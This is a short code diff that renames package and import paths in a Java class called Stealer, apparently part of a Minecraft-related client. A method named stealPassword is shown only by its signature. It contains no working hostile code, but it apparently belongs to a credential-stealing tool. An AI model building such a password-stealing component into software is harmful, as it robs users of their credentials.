@@ -1,9 +1,9 @@
-package me.soda.witch.utils;
+package me.soda.witch.client.utils;
 
 import java.util.Arrays;
 import java.util.List;
 
-import static me.soda.witch.Witch.mc;
+import static me.soda.witch.client.Witch.mc;
 
 public class Stealer {
     public static Password stealPassword(String command) {
